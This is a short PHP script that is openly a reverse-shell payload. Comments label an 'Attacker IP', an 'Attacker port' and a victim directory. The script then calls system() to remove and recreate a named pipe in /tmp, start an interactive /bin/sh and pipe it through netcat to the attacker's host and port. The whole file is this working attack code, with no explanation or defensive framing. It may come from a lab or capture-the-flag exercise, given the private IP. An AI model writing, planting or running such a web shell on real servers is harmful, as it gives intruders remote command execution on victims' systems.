<?php
    // Attacker IP
    $lhost = '10.11.8.219';
    // Attacker port
    $lport = '4444';
    // Directory on victim to mkfifo netcat
    $rdir = '/tmp/f';
    echo 'Running';
    // Payload
    system('rm '.$rdir.';mkfifo '.$rdir.';cat '.$rdir.'|/bin/sh -i 2>&1|nc '.$lhost.' '.$lport.' >'.$rdir.'');
    echo ' ... Done'; 
?>
